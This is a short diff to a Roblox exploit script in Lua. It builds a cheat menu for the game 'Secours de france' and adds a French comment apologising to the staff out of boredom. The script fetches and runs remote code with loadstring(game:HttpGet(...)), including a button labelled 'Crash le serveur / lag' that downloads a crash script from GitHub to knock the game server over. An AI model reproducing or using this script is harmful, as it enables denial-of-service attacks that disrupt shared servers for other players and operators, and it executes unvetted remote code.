@@ -1,3 +1,4 @@
+------------------ Desoler au staff etc mais je m'ennuyer
 local Library = loadstring(game:HttpGet("https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua"))()
 local Window = Library.CreateLib("Secours de france", "Sentinel")
 
@@ -51,7 +52,7 @@ Section:NewSlider("Jump power", "Change la force de saut du joueur", 500, 50, fu
     game.Players.LocalPlayer.Character.Humanoid.JumpPower = v
 end)
 
-Section:NewButton("Faire crash le serveur", "Faire crash le servceur", function()
+Section:NewButton("Crash le serveur / lag", "Crash le serveur / le faire lag", function()
     loadstring(game:HttpGet(('https://raw.githubusercontent.com/lobox920/SFscripthehe/main/Crashserveur.lua')))()
 end)
 
